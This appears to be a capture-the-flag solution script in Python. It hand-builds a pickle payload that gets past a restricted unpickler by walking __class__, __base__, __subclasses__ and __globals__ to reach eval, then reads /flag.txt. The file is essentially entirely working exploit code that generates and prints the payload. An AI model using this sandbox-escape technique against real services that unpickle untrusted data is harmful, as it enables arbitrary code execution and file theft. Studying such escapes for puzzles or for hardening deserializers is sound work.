import pickle
import pickletools
import io
import sys
import empty  # module with nothing

empty.empty = empty


class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "empty" and name.count(".") <= 1:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("e-legal")


def load_global(mod, name):
    return pickle.GLOBAL + mod.encode() + b"\n" + name.encode() + b"\n"


def load_int(n):
    return pickle.INT + str(n).encode() + b"\n"


def load_tuple(*items):
    if len(items) == 0:
        return pickle.EMPTY_TUPLE
    return pickle.MARK + b"".join(items) + pickle.TUPLE


def load_str(s):
    return pickle.SHORT_BINSTRING + bytes([len(s)]) + s.encode()


def load_dict(d):
    return pickle.MARK + b"".join([k + v for (k, v) in d.items()]) + pickle.DICT


def load_setattr(attrs):
    return load_tuple(pickle.EMPTY_DICT, load_dict(attrs)) + pickle.BUILD


def load_put(n):
    return pickle.PUT + str(n).encode() + b"\n"


def load_get(n):
    return pickle.GET + str(n).encode() + b"\n"


def load_call(f, *args):
    return f + load_tuple(*args) + pickle.REDUCE


x = load_str("a")


def load_attr(attr, n):
    return (
        load_global("empty", f"a.{attr}")
        + load_put(n)
        + load_get(0)
        + load_setattr({x: load_get(n)})
    )


def load_attr_func(attr, n, *args):
    return (
        pickle.MARK
        + b"".join(args)
        + pickle.INST
        + b"empty\na."
        + attr.encode()
        + b"\n"
        + load_put(n)
        + load_get(0)
        + load_setattr({x: load_get(n)})
    )


def load_gcall(n, *args, i=-1):
    return (
        load_call(load_global("empty", "a") if i == -1 else load_get(i), *args)
        + load_put(n)
        + load_get(0)
        + load_setattr({x: load_get(n)})
    )


lepickle = b"".join(
    [
        b"\x80\x04",
        pickle.MARK,
        load_global("empty", "empty"),
        load_put(0),
        load_setattr({x: load_tuple()}),
        load_attr("__class__", 1),
        load_attr("__base__", 2),
        load_attr_func("__subclasses__", 3),
        load_attr_func("__getitem__", 4, load_int(-1)),
        load_attr("__init__", 5),
        load_attr("__globals__", 6),
        load_attr_func("get", 7, load_str("__builtins__")),
        load_attr_func("get", 8, load_str("eval")),
        load_call(load_get(8), load_str("print(open('/flag.txt').read())")),
        pickle.TUPLE,
        pickle.STOP,
    ]
)
print(len(lepickle), file=sys.stderr)
print(lepickle.hex())
# pickletools.dis(lepickle)
# print(SafeUnpickler(io.BytesIO(lepickle)).load())
# print(empty.a)
